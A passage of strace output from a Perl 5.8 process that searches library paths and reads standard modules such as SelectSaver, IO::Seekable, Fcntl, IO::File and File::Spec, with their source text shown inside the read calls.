delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
12318 07:41:50.080836 read(8, "", 4096) = 0
12318 07:41:50.080851 close(8)          = 0
12318 07:41:50.080914 stat64("/etc/perl/SelectSaver.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.080930 stat64("/etc/perl/SelectSaver.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.080944 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.080985 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.081007 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.081034 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.081048 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.081060 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.081073 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.081085 stat64("/usr/share/perl5/SelectSaver.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.081098 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.081111 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.081126 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.081138 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
12318 07:41:50.081159 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.081174 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.081186 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.081204 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
12318 07:41:50.081327 brk(0x81d6000)    = 0x81d6000
12318 07:41:50.081357 read(8, "", 4096) = 0
12318 07:41:50.081368 close(8)          = 0
12318 07:41:50.081719 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
12318 07:41:50.082566 read(6, "", 4096) = 0
12318 07:41:50.082583 close(6)          = 0
12318 07:41:50.082621 stat64("/etc/perl/IO/Seekable.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.082637 stat64("/etc/perl/IO/Seekable.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.082651 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.082664 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.082678 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.082691 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.082705 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.082717 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.082730 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.082742 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.082755 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.082768 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
12318 07:41:50.082789 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
12318 07:41:50.082804 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff551c8) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.082816 _llseek(6, 0, [0], SEEK_CUR) = 0
12318 07:41:50.082834 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
12318 07:41:50.083048 stat64("/etc/perl/Fcntl.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.083064 stat64("/etc/perl/Fcntl.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.083078 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.083091 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.083105 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.083130 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.083144 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.083156 stat64("/usr/lib/perl5/Fcntl.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.083169 stat64("/usr/share/perl5/Fcntl.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.083180 stat64("/usr/share/perl5/Fcntl.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.083193 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.083205 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
12318 07:41:50.083226 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.083240 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.083251 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.083269 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
12318 07:41:50.083648 brk(0x81f7000)    = 0x81f7000
12318 07:41:50.083822 read(8, "", 4096) = 0
12318 07:41:50.083836 close(8)          = 0
12318 07:41:50.083904 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
12318 07:41:50.083992 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12318 07:41:50.084035 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY <unfinished ...>
12316 07:41:50.084054 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
12318 07:41:50.084064 <... open resumed> ) = 8
12318 07:41:50.084070 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
12318 07:41:50.084174 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
12318 07:41:50.084192 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0 <unfinished ...>
12316 07:41:50.084199 <... rt_sigprocmask resumed> NULL, 8) = 0
12316 07:41:50.084215 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
12318 07:41:50.084225 <... mmap2 resumed> ) = 0xb7d52000
12318 07:41:50.084232 mmap2(0xb7d55000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d55000
12318 07:41:50.084247 close(8 <unfinished ...>
12316 07:41:50.084253 <... rt_sigprocmask resumed> [], 8) = 0
12318 07:41:50.084260 <... close resumed> ) = 0
12316 07:41:50.084268 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
12318 07:41:50.084512 read(6,  <unfinished ...>
12316 07:41:50.084521 <... rt_sigprocmask resumed> NULL, 8) = 0
12316 07:41:50.084532 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12316 07:41:50.084546 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
12316 07:41:50.084560 waitpid(-1,  <unfinished ...>
12318 07:41:50.084578 <... read resumed> "", 4096) = 0
12318 07:41:50.084586 close(6)          = 0
12318 07:41:50.084618 stat64("/etc/perl/IO/File.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.084632 stat64("/etc/perl/IO/File.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.084646 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.084659 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.084673 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.084685 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.084699 stat64("/usr/lib/perl5/IO/File.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.084710 stat64("/usr/lib/perl5/IO/File.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.084723 stat64("/usr/share/perl5/IO/File.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.084735 stat64("/usr/share/perl5/IO/File.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.084748 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.084761 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
12318 07:41:50.084781 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
12318 07:41:50.084796 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff551c8) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.084807 _llseek(6, 0, [0], SEEK_CUR) = 0
12318 07:41:50.084824 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
12318 07:41:50.085159 stat64("/etc/perl/File/Spec.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.085175 stat64("/etc/perl/File/Spec.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.085192 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.085205 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.085219 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.085232 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.085246 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.086416 stat64("/usr/lib/perl5/File/Spec.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.086548 stat64("/usr/share/perl5/File/Spec.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.086611 stat64("/usr/share/perl5/File/Spec.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.086663 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.086691 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.086715 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.086732 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
12318 07:41:50.086754 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.086769 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.086780 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.086798 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
